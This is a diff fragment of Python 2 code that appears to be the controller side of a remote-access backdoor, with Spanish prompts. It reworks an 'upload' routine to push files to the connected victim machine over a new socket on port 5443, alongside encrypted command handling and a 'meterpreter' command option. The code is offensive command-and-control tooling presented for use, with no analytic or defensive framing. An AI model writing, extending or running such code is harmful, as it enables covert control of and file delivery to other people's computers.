@@ -159,18 +159,20 @@ def encodeCipher(aes, data):
     return base64.b64encode(encryp_msg)
 
 #Sent File Method
-def sent(con, fileName):
+def sent(ip, aes, fileName):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, int(5443)))
     f = open(fileName,'rb')
     print f
     print 'Sending...'
     l = f.read(1024)
     while (l):
         print 'Sending...'
-        con.send(l)
+        s.send(l)
         l = f.read(1024)
     f.close()
-    con.send('File has been sent')
     print "Done Sending"
+    s.close()
 
 
 def main():
@@ -205,9 +207,10 @@ def main():
                     if cmd == 'upload':
                         req_str = option(con, aes, cmd)
                         fileName = raw_input("¿Cual es la ruta del fichero?: ")
-                        fileDest = raw_input("¿Cual es el nombre que quiere que tenga en el destino (indique ext): ")
+                        fileDest = raw_input(req_str)
                         req_str = option(con, aes, fileDest)
-                        sent(con, fileName)
+                        sent(con.getpeername()[0], aes, fileName)
+                        cmd = 'ok'
                     if code == "1" and cmd == "meterpreter":
                         cmd = meterpreter()
                         code = "0"
